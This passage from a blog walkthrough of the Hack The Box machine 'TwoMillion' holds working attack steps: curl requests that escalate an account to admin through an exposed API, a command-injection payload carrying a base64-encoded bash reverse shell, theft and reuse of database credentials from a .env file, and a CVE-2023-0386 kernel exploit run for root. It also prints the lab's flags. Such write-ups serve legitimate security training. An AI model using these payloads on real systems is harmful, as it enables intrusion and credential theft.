+</pre><td class="rouge-code"><pre>$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" --header "Content-Type: application/json" | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+&gt; PUT /api/v1/admin/settings/update HTTP/1.1
+&gt; Host: 2million.htb
+&gt; User-Agent: curl/8.8.0
+&gt; Accept: */*
+&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
+&gt; Content-Type: application/json
+&gt;
+* Request completely sent off
+&lt; HTTP/1.1 200 OK
+&lt; Server: nginx
+&lt; Date: Tue, 06 Aug 2024 18:43:42 GMT
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt;
+{ [67 bytes data]
+100    56    0    56    0     0     49      0 --:--:--  0:00:01 --:--:--    49
+* Connection #0 to host 2million.htb left intact
+{
+  "status": "danger",
+  "message": "Missing parameter: email"
+}
+</pre></table></code></div></div><p>It worked but now we are missing the <code class="language-plaintext highlighter-rouge">email</code>parameter. with <code class="language-plaintext highlighter-rouge">--data</code> add the <code class="language-plaintext highlighter-rouge">email</code>parameter:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+</pre><td class="rouge-code"><pre>$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" --header "Content-Type: application/json" --data '{"email":"test@test.com"}' | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+&gt; PUT /api/v1/admin/settings/update HTTP/1.1
+&gt; Host: 2million.htb
+&gt; User-Agent: curl/8.8.0
+&gt; Accept: */*
+&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
+&gt; Content-Type: application/json
+&gt; Content-Length: 25
+&gt;
+} [25 bytes data]
+* upload completely sent off: 25 bytes
+&lt; HTTP/1.1 200 OK
+&lt; Server: nginx
+&lt; Date: Tue, 06 Aug 2024 18:45:00 GMT
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt;
+{ [70 bytes data]
+100    84    0    59  100    25     72     30 --:--:-- --:--:-- --:--:--   102
+* Connection #0 to host 2million.htb left intact
+{
+  "status": "danger",
+  "message": "Missing parameter: is_admin"
+}
+</pre></table></code></div></div><p>Now we need the <code class="language-plaintext highlighter-rouge">is_admin</code>parameter:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre>$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" --header "Content-Type: application/json" --data '{"email":"test@test.com", "is_admin": 1 }' | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+&gt; PUT /api/v1/admin/settings/update HTTP/1.1
+&gt; Host: 2million.htb
+&gt; User-Agent: curl/8.8.0
+&gt; Accept: */*
+&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
+&gt; Content-Type: application/json
+&gt; Content-Length: 41
+&gt;
+} [41 bytes data]
+* upload completely sent off: 41 bytes
+&lt; HTTP/1.1 200 OK
+&lt; Server: nginx
+&lt; Date: Tue, 06 Aug 2024 18:45:51 GMT
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt;
+{ [55 bytes data]
+100    85    0    44  100    41     50     47 --:--:-- --:--:-- --:--:--    97
+* Connection #0 to host 2million.htb left intact
+{
+  "id": 13,
+  "username": "shavigio",
+  "is_admin": 1
+}
+</pre></table></code></div></div><p>We are admin now.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>$ curl -sv http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" --header "Content-Type: application/json" --data '{"username" :"shavigio"}'
+</pre></table></code></div></div><p>This will provide <code class="language-plaintext highlighter-rouge">vpn</code>for admin and it is long <code class="language-plaintext highlighter-rouge">ahh</code> text maybe not worth reading <code class="language-plaintext highlighter-rouge">IDK</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>$ curl -sv http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" --header "Content-Type: application/json" --data '{"username" :"shavigio;id;"}'
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+* Connection #0 to host 2million.htb left intact
+</pre></table></code></div></div><p>This means we can execute commands here. Logically we can use this for <code class="language-plaintext highlighter-rouge">NetCat</code>connection. Go to <a href="https://www.revshells.com/">revshells</a> and use the <code class="language-plaintext highlighter-rouge">bash -i</code>code. Enter your <code class="language-plaintext highlighter-rouge">IP</code>and <code class="language-plaintext highlighter-rouge">Port</code>, Copy that and encode that with <code class="language-plaintext highlighter-rouge">base64</code>, Then execute this command:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>nc -nlvp &lt;port&gt; # in other terminal
+$ curl -sv http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" --header "Content-Type: application/json" --data '{"username" :"shavigio;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy8xMjM0IDA+JjEK |base64 -d |bash;"}'
+</pre></table></code></div></div><p>That will give us the connection on <code class="language-plaintext highlighter-rouge">NetCat</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre>$ nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.11.221] 35764
+sh: 0: can't access tty; job control turned off
+$ ls -la
+total 56
+drwxr-xr-x 10 root root 4096 Aug  6 20:20 .
+drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
+-rw-r--r--  1 root root   87 Jun  2  2023 .env
+-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
+-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
+drwxr-xr-x  5 root root 4096 Aug  6 20:20 VPN
+drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
+drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
+drwxr-xr-x  5 root root 4096 Jun  6  2023 css
+drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
+drwxr-xr-x  2 root root 4096 Jun  6  2023 images
+-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
+drwxr-xr-x  3 root root 4096 Jun  6  2023 js
+drwxr-xr-x  2 root root 4096 Jun  6  2023 views
+$ cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+</pre></table></code></div></div><p>Go to <code class="language-plaintext highlighter-rouge">ssh</code>and use that credentials:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>ssh admin@10.10.11.221
+Password:SuperDuperPass123
+</pre></table></code></div></div><hr /><p>And you can <code class="language-plaintext highlighter-rouge">cat</code>the <code class="language-plaintext highlighter-rouge">user.txt</code>:b165c7aa079232172893c8fa3c8f2123 *** We can’t execute any commands with root’s permission:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>$ sudo -l
+[sudo] password for admin:
+Sorry, try again.
+[sudo] password for admin:
+Sorry, user admin may not run sudo on localhost.
+</pre></table></code></div></div><p>This means that there is some exploit we need to find. Since the site is in <code class="language-plaintext highlighter-rouge">/var</code>directory i went to that and there was <code class="language-plaintext highlighter-rouge">/mail</code>directory:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre>$ cd /var
+admin@2million:/var$ ls
+backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
+admin@2million:/var$ cd mail
+admin@2million:/var/mail$ ls
+admin
+admin@2million:/var/mail$ cat admin
+From: ch4p &lt;ch4p@2million.htb&gt;
+To: admin &lt;admin@2million.htb&gt;
+Cc: g0blin &lt;g0blin@2million.htb&gt;
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: &lt;9876543210@2million.htb&gt;
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather
+</pre></table></code></div></div><p>Here we go, there is named the exploit.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>admin@2million:/var/mail$ uname -a
+Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">uname -a</code>tells us that <code class="language-plaintext highlighter-rouge">kernel</code>version is <code class="language-plaintext highlighter-rouge">5.15.70</code> There is exploits on that. Searching to that brought me to<code class="language-plaintext highlighter-rouge">Github</code>repository.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>git clone https://github.com/xkaneiki/CVE-2023-0386
+Cloning into 'CVE-2023-0386'...
+remote: Enumerating objects: 24, done.
+remote: Counting objects: 100% (24/24), done.
+remote: Compressing objects: 100% (15/15), done.
+remote: Total 24 (delta 7), reused 21 (delta 5), pack-reused 0
+Receiving objects: 100% (24/24), 426.11 KiB | 360.00 KiB/s, done.
+Resolving deltas: 100% (7/7), done.
+</pre></table></code></div></div><p>I zipped it so it would be easier to transfer it to the machine, and i used <code class="language-plaintext highlighter-rouge">scp</code>to move it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>zip -r cve.zip CVE-2023-0386/
+scp cve.zip admin@2million.htb:/tmp
+The authenticity of host '2million.htb (10.10.11.221)' can't be established.
+ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:69: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '2million.htb' (ED25519) to the list of known hosts.
+admin@2million.htb's password:
+cve.zip
+</pre></table></code></div></div><p>Unzip the copied file, go to directory and run the code:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>./fuse ./ovlcap/lower ./gc &amp;
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">&amp;</code>because it needs to be running in the background. and Then:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>./exp
+</pre></table></code></div></div><p>Running the last command will make you the <code class="language-plaintext highlighter-rouge">root</code>and then you can see the <code class="language-plaintext highlighter-rouge">root flag</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>root@2million:/tmp/CVE-2023-0386# id
+uid=0(root) gid=0(root) groups=0(root),1000(admin)
+root@2million:/tmp/CVE-2023-0386# cat /root/root.txt
+e688bd39f1e4405adc18fdc720bf21d8
+</pre></table></code></div></div><hr /><p>root flag: e688bd39f1e4405adc18fdc720bf21d8 *** <img data-src="/assets/images/Screenshot from 2024-08-06 23-38-27.png" alt="screen" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >Hack The Box</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TwoMillion+from+HTB+-+darkfears31%27s+Walktroughs&url=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2Ftwomillion-from-HTB%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TwoMillion+from+HTB+-+darkfears31%27s+Walktroughs&u=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2Ftwomillion-from-HTB%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2Ftwomillion-from-HTB%2F&text=TwoMillion+from+HTB+-+darkfears31%27s+Walktroughs" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Tabby-from-HTB/">Tabby from HTB</a><li><a href="/posts/Stonks-from-PicoCTF/">Stonks from PicoCTF</a><li><a href="/posts/Backdoor-from-HTB/">Backdoor from HTB</a><li><a href="/posts/Antique-from-HTB/">Antique from HTB</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">Hack The Box</a> <a class="post-tag" href="/tags/picoctf/">PicoCTF</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Codify-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725580800" data-df="ll" > Sep 6, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Codify from HTB"</h3><div class="text-muted small"><p> Codify from HTB page Nmap gave nothing unusual. Went to the site and saw vm2and then went for vm2 exploitand got to this github: https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244 c...</p></div></div></a></div><div class="card"> <a href="/posts/CozyHosting-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725580800" data-df="ll" > Sep 6, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CozyHosting from HTB</h3><div class="text-muted small"><p> CozyHosting from HTB page Nmap gave this: nmap -sCV --min-rate 4000 10.10.11.230 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 18:47 +04 Nmap scan report for cozyhosting.htb (10.10.11.23...</p></div></div></a></div><div class="card"> <a href="/posts/Devvortex-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725580800" data-df="ll" > Sep 6, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Devvortex from HTB</h3><div class="text-muted small"><p> Devvortex from HTB page Nmapgave this: nmap -sCV --min-rate 4000 10.10.11.242 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 15:06 +04 Nmap scan report for devvortex.htb (10.10.11.242) Ho...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tic-toe-from-PicoCTF/" class="btn btn-outline-primary" prompt="Older"><p>Tic-Toe from PicoCTF</p></a> <a href="/posts/Academy-from-HTB/" class="btn btn-outline-primary" prompt="Newer"><p>Academy from HTB</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/darkfears31">kaikaci</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">Hack The Box</a> <a class="post-tag" href="/tags/picoctf/">PicoCTF</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
